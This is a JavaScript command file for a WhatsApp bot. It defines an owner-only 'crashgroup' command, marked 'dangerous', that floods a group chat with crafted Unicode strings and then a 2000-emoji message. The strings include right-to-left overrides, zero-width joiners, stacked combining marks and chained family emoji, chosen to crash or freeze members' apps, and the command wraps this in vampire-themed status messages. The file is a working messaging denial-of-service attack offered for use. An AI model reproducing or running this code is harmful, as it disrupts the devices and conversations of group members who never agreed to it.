export default {
  name: 'crashgroup',
  description: 'Crash a group with special characters',
  category: 'dangerous',
  aliases: ['gcrash', 'groupcrash'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;

    if (!chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ This command can only be used in groups.
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }

    const confirm = args[0]?.toLowerCase();

    if (confirm !== 'confirm') {
      return sock.sendMessage(chatId, {
        text: `╭━━━〔 ⚠️ CRASH GROUP 〕━━━┈⊷
┃ This will crash the group!
┃ Type: ${prefix}crashgroup confirm
┃ 
┃ 🧛 "The darkness consumes the coven."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ CRASHING GROUP 〕━━━┈⊷
┃ 🧛 "The darkness consumes..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      const crashChars = [
        '‮⁦⁦⁦⁩⁩⁩‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦',
        '🫸🫷🫸🫷🫸🫷🫸🫷🫸🫷',
        '⁣‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌',
        '⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤',
        '̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸'
      ];

      for (let i = 0; i < 5; i++) {
        try {
          await sock.sendMessage(chatId, {
            text: crashChars[i % crashChars.length].repeat(5)
          });
          await new Promise(resolve => setTimeout(resolve, 300));
        } catch {}
      }

      let largeMsg = '';
      for (let i = 0; i < 2000; i++) {
        largeMsg += '🩸';
      }

      await sock.sendMessage(chatId, {
        text: largeMsg
      });

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ GROUP CRASHED 〕━━━┈⊷
┃ The coven has been crashed!
┃ 🧛 "The darkness consumes."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
